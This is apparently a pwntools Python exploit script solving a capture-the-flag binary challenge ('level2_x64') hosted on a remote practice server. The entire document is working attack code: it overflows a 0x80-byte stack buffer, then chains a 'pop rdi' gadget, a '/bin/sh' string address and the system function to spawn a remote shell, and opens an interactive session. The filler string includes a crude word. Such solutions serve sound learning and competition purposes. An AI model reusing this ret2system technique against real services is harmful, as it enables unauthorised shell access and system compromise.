from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27561)
e = ELF('./level2_x64')
system_address = e.symbols['system'] # 0x4004C0
bin_sh_address = 0x600A90 # ROPgadget --binary ./level2_x64 --string "/bin/sh"
pop_rdi = 0x4006B3 # ROPgadget --binary ./level2_x64 --only "pop|ret"
payload = b'a'*0x80 + b'fuckpwn!'
payload += p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendlineafter(b'Input:\n', payload)
io.interactive()